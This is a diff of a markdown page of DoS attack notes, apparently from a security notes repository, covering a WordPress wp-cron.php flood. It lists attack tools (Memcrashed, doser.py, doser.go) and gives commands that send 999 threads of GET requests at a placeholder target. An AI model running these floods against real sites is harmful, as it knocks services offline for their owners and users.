@@ -89,11 +89,12 @@ Now, the victim’s machine takes twice the bandwidth of the attacker – once f
 - Memcrashed - DDoS attack tool for sending forged UDP packets to vulnerable Memcached servers obtained using Shodan API.
 - [doser.go](https://github.com/Quitten/doser.py): DoS tool for HTTP requests
 
-### wp-cron.php DoS attack (Wordpress)
+## DoS attack-1: wp-cron.php (Wordpress)
 By default, the “wp-cron.php” file is called on every page load like anytime a client requests any Wordpress page which on high-traffic sites can cause (DoS) problems 
 
 This file usually exists under the root of wordpress site: /wp-cron.php 
-<img width="875" alt="Untitled" src="https://github.com/NayanDZ/Dos/assets/65315090/67076a7d-4c57-4acf-b9a8-7f77ad93ebe8">
+<img width="900" alt="Untitled" src="https://github.com/NayanDZ/Dos/assets/65315090/d275cb44-10a2-4b42-9d9b-1b952971f117">
+<img width="900" alt="11111" src="https://github.com/NayanDZ/Dos/assets/65315090/e73893cf-0b8a-4841-a342-025dc902af62">
 
 ```
 $ python doser.py -t 999 -g 'https://target.site.com'
@@ -104,7 +105,8 @@ Go Language Command (Rewrite to Golang)
 2. Use it (For example: 999 threads sends GET requests
 ./doser -t 999 -g 'https://target.site.com'
 ```
-<img width="746" alt="11111" src="https://github.com/NayanDZ/Dos/assets/65315090/e73893cf-0b8a-4841-a342-025dc902af62">
+#### Tools Used
+- [doser.py](https://github.com/Quitten/doser.py): Tool for HTTP requests
 
 
 ### Usefull Refrence Link
